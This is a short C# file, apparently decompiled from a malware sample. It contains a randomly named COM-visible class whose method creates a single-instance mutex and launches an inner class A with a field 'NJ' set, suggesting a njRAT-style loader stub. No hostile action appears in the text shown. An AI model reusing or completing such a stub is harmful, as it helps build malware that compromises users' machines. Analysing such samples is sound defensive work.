using System;
using System.Runtime.InteropServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;
using oyhnnxoksms.My;

namespace oyhnnxoksms;

[ComVisible(true)]
[ClassInterface(ClassInterfaceType.None)]
public class oyhnnxoksms
{
	public static Mutex MT;

	public oyhnnxoksms()
	{
		MyApplication.k();
	}

	public void W(string m)
	{
		try
		{
			MT = new Mutex(initiallyOwned: true, m);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		A a = new A();
		a.NJ = true;
		a.WL();
	}
}
